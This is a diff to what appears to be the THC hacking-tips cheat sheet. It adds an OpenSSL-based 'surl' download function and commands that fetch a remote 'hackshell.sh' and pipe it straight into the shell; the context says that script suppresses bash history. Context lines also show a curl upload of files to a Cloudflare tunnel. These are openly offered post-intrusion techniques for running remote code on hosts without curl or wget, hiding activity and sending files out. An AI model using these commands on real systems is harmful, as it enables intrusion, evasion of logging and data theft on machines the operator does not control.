@@ -48,7 +48,7 @@ Got tricks? Join us on Telegram: [https://t.me/thcorg](https://t.me/thcorg)
    1. [File transfer using screen](#file-transfer-screen)
    1. [File transfer using gs-netcat and sftp](#file-transfer-gs-netcat)
    1. [File transfer using HTTP](#http)
-   1. [File transfer without curl](#burl)
+   1. [File download without curl](#download)
    2. [File transfer using rsync](#rsync)
    1. [File transfer to public dump sites](#trans) 
    1. [File transfer using WebDAV](#webdav)
@@ -125,6 +125,12 @@ Make BASH less noisy. Disables *~/.bash_history* and [many other things](https:/
 Alternative URL:
 ```sh
  source <(curl -SsfL https://github.com/hackerschoice/hackshell/raw/main/hackshell.sh)
+```
+
+And if there is no curl/wget, use [surl](#download) and (temporarily) installed curl with `bin curl`.
+```sh
+source <(surl https://raw.githubusercontent.com/hackerschoice/hackshell/main/hackshell.sh)
+# Afterwards type `bin curl` to install curl
 ```
 
 It does much more but most importantly this:
@@ -1182,8 +1188,21 @@ curl -X POST  https://CF-URL-CHANGE-ME.trycloudflare.com/upload -F 'files=@myfil
 ```
 
 ---
-<a id="burl"></a>
-### 4.vi. File transfer without curl
+<a id="download"></a>
+### 4.vi. File download without curl
+
+Using OpenSSL, download only:
+```sh
+surl() {
+    local r="${1#*://}"
+    IFS=/ read -r host query <<<"${r}"
+    echo -en "GET /${query} HTTP/1.0\r\nHost: ${host%%:*}\r\n\r\n" \
+	| openssl s_client -ignore_unexpected_eof -verify_quiet -quiet -ign_eof -connect "${host%%:*}:443" \
+	| sed '1,/^\r\{0,1\}$/d'
+}
+# surl https://ipinfo.io
+# source <(surl https://raw.githubusercontent.com/hackerschoice/hackshell/main/hackshell.sh)
+```
 
 Using bash, download only:
 ```sh
